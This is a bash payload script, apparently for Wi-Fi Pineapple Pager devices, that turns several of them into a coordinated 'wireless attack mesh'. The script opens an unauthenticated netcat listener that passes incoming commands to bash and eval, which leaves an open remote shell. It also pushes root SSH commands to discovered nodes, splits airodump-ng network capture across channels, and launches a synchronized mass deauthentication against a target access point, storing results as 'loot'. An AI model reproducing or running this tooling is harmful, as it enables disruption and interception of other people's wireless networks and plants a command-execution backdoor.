#!/bin/bash
# ============================================================
# NullSec: Swarm Controller - Multi-Pager Mesh Coordination
# Author: bad-antics
# Description: Coordinate multiple Pineapple Pagers as a wireless attack mesh
# Category: pager/mesh
#
# UNIQUE FEATURES:
# - Multi-pager discovery and registration
# - Coordinated attack synchronization
# - Distributed task scheduling
# - Real-time mesh health monitoring
# - Automatic failover and redistribution
# - Encrypted inter-node communication
# ============================================================

PAYLOAD_NAME="Swarm Controller"
VERSION="1.0.0"
LOOT="/root/loot/mesh"
LOG="$LOOT/swarm.log"
MESH_PORT=9999
MESH_KEY="nullsec-swarm-$(date +%Y)"

init_payload() {
    mkdir -p "$LOOT"/{nodes,tasks,results,status}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "SWARM" "Initializing mesh controller..."
}

discover_nodes() {
    NOTIFY "DISCOVER" "Scanning for mesh nodes..."
    
    local NODES_FILE="$LOOT/nodes/active.txt"
    > "$NODES_FILE"
    
    MY_IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    MY_SUBNET=$(echo "$MY_IP" | cut -d. -f1-3)
    
    # Scan subnet for other pagers
    for i in $(seq 1 254); do
        IP="${MY_SUBNET}.${i}"
        [ "$IP" = "$MY_IP" ] && continue
        
        (
            # Check if it's a pager (responds on mesh port or has SSH)
            if timeout 2 bash -c "echo PING | nc $IP $MESH_PORT" 2>/dev/null | grep -q "PONG"; then
                HOSTNAME=$(ssh -o BatchMode=yes -o ConnectTimeout=2 root@"$IP" hostname 2>/dev/null)
                echo "$IP|$HOSTNAME|mesh-native" >> "$NODES_FILE"
            elif ssh -o BatchMode=yes -o ConnectTimeout=2 root@"$IP" "uname -a" 2>/dev/null | grep -qi "pineapple\|openwrt"; then
                HOSTNAME=$(ssh -o BatchMode=yes -o ConnectTimeout=2 root@"$IP" hostname 2>/dev/null)
                echo "$IP|$HOSTNAME|ssh-capable" >> "$NODES_FILE"
            fi
        ) &
    done
    wait
    
    NODE_COUNT=$(wc -l < "$NODES_FILE" 2>/dev/null || echo 0)
    NOTIFY "DISCOVER" "Found $NODE_COUNT mesh nodes"
    echo "[$(date)] Discovered $NODE_COUNT nodes" >> "$LOG"
}

start_mesh_listener() {
    NOTIFY "LISTEN" "Starting mesh listener on port $MESH_PORT..."
    
    # Simple mesh protocol listener
    while true; do
        nc -l -p "$MESH_PORT" -e /bin/bash -c '
            read CMD
            case "$CMD" in
                PING) echo "PONG|$(hostname)|$(date +%s)" ;;
                STATUS) echo "OK|$(uptime)|$(free -m | awk "/Mem/{print \$3\"/\"\$2}")" ;;
                TASK*)
                    TASK="${CMD#TASK }"
                    eval "$TASK" 2>&1
                    ;;
                RESULTS) cat /root/loot/mesh/results/*.txt 2>/dev/null ;;
            esac
        ' 2>/dev/null
    done &
    echo $! > /tmp/mesh_listener.pid
}

distribute_task() {
    local TASK="$1" TASK_NAME="$2"
    NOTIFY "TASK" "Distributing: $TASK_NAME..."
    
    local TASK_ID="TASK-$(date +%s)"
    local NODES_FILE="$LOOT/nodes/active.txt"
    local RESULTS_DIR="$LOOT/results/$TASK_ID"
    mkdir -p "$RESULTS_DIR"
    
    NODE_NUM=0
    while IFS='|' read -r IP HOSTNAME TYPE; do
        NODE_NUM=$((NODE_NUM + 1))
        
        case "$TYPE" in
            mesh-native)
                echo "TASK $TASK" | nc -w 10 "$IP" "$MESH_PORT" > "$RESULTS_DIR/node_${NODE_NUM}.txt" 2>/dev/null &
                ;;
            ssh-capable)
                ssh -o BatchMode=yes -o ConnectTimeout=5 root@"$IP" "$TASK" > "$RESULTS_DIR/node_${NODE_NUM}.txt" 2>/dev/null &
                ;;
        esac
        
        echo "[$(date)] Task $TASK_ID sent to $IP ($HOSTNAME)" >> "$LOG"
    done < "$NODES_FILE"
    
    wait
    
    # Merge results
    cat "$RESULTS_DIR/"*.txt > "$RESULTS_DIR/merged.txt" 2>/dev/null
    RESULT_LINES=$(wc -l < "$RESULTS_DIR/merged.txt" 2>/dev/null || echo 0)
    NOTIFY "TASK" "$TASK_NAME complete: $RESULT_LINES lines from $NODE_NUM nodes"
}

coordinated_scan() {
    NOTIFY "SCAN" "Coordinated mesh scan..."
    
    local NODES_FILE="$LOOT/nodes/active.txt"
    NODE_COUNT=$(wc -l < "$NODES_FILE" 2>/dev/null || echo 0)
    
    if [ "$NODE_COUNT" -eq 0 ]; then
        NOTIFY "ERROR" "No mesh nodes available"
        return
    fi
    
    # Divide channels among nodes
    CHANNELS_PER_NODE=$((14 / (NODE_COUNT + 1)))
    
    NODE_NUM=0
    while IFS='|' read -r IP HOSTNAME TYPE; do
        START_CH=$((NODE_NUM * CHANNELS_PER_NODE + 1))
        END_CH=$(( (NODE_NUM + 1) * CHANNELS_PER_NODE))
        [ "$END_CH" -gt 14 ] && END_CH=14
        
        SCAN_CMD="for ch in \$(seq $START_CH $END_CH); do iwconfig wlan0mon channel \$ch; airodump-ng --channel \$ch -w /tmp/mesh_scan_\${ch} --output-format csv wlan0mon & sleep 5; kill \$!; done; cat /tmp/mesh_scan_*.csv"
        
        ssh -o BatchMode=yes root@"$IP" "$SCAN_CMD" > "$LOOT/results/scan_${IP}.csv" 2>/dev/null &
        NODE_NUM=$((NODE_NUM + 1))
    done < "$NODES_FILE"
    
    # Local node scans remaining channels
    for ch in $(seq $((NODE_NUM * CHANNELS_PER_NODE + 1)) 14); do
        iwconfig wlan0mon channel "$ch" 2>/dev/null
        timeout 5 airodump-ng --channel "$ch" -w "/tmp/mesh_scan_local_${ch}" --output-format csv wlan0mon 2>/dev/null
    done
    
    wait
    
    # Merge all scan results
    cat "$LOOT/results/scan_"*.csv /tmp/mesh_scan_local_*.csv 2>/dev/null | sort -u > "$LOOT/results/full_scan.csv"
    NETWORKS=$(grep -c "WPA\|WEP\|OPN" "$LOOT/results/full_scan.csv" 2>/dev/null || echo 0)
    NOTIFY "SCAN" "Mesh scan complete: $NETWORKS networks across $((NODE_NUM + 1)) nodes"
}

coordinated_deauth() {
    local TARGET_BSSID="$1"
    NOTIFY "DEAUTH" "Coordinated deauth: $TARGET_BSSID..."
    
    distribute_task "aireplay-ng -0 0 -a $TARGET_BSSID wlan0mon &>/dev/null & sleep 30; kill \$!" "Mass Deauth"
}

mesh_status() {
    NOTIFY "STATUS" "Checking mesh health..."
    
    local STATUS_FILE="$LOOT/status/mesh_$(date +%Y%m%d_%H%M).txt"
    local NODES_FILE="$LOOT/nodes/active.txt"
    
    {
        echo "=== MESH STATUS $(date) ==="
        echo "Controller: $(hostname) ($(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}'))"
        echo ""
        
        ONLINE=0
        OFFLINE=0
        while IFS='|' read -r IP HOSTNAME TYPE; do
            if ssh -o BatchMode=yes -o ConnectTimeout=3 root@"$IP" "echo OK" 2>/dev/null | grep -q "OK"; then
                LOAD=$(ssh -o BatchMode=yes root@"$IP" "cat /proc/loadavg | awk '{print \$1}'" 2>/dev/null)
                MEM=$(ssh -o BatchMode=yes root@"$IP" "free -m | awk '/Mem/{printf \"%d/%dMB\",\$3,\$2}'" 2>/dev/null)
                echo "[ONLINE]  $IP ($HOSTNAME) | Load: $LOAD | Mem: $MEM"
                ONLINE=$((ONLINE + 1))
            else
                echo "[OFFLINE] $IP ($HOSTNAME)"
                OFFLINE=$((OFFLINE + 1))
            fi
        done < "$NODES_FILE"
        
        echo ""
        echo "Online: $ONLINE | Offline: $OFFLINE | Total: $((ONLINE + OFFLINE))"
    } > "$STATUS_FILE"
    
    cat "$STATUS_FILE"
    NOTIFY "STATUS" "Mesh: $ONLINE online, $OFFLINE offline"
}

main() {
    init_payload
    start_mesh_listener
    discover_nodes
    mesh_status
    coordinated_scan
    
    NODE_COUNT=$(wc -l < "$LOOT/nodes/active.txt" 2>/dev/null || echo 0)
    NOTIFY "DONE" "Swarm active: $((NODE_COUNT + 1)) nodes in mesh"
}

main "$@"
